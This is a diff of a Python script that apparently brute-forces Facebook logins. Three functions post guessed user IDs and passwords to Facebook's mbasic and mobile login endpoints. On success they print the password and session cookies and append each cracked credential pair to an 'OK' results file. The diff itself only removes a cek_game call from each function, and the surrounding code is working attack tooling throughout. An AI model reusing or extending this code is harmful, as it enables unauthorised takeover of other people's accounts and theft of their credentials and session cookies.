@@ -1188,7 +1188,6 @@ def mbasic(uid, fii):
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			cek_game(kuki)
 			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
 			ok.append("%s|%s"%(uid, pw))
 			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
@@ -1244,7 +1243,6 @@ def mbasicc(uid, fii):
 		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			cek_game(kuki)
 			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
 			ok.append("%s|%s"%(uid, pw))
 			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
@@ -1300,7 +1298,6 @@ def mobil(uid, fii):
 		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
-			cek_game(kuki)
 			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
 			ok.append("%s|%s"%(uid, pw))
 			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
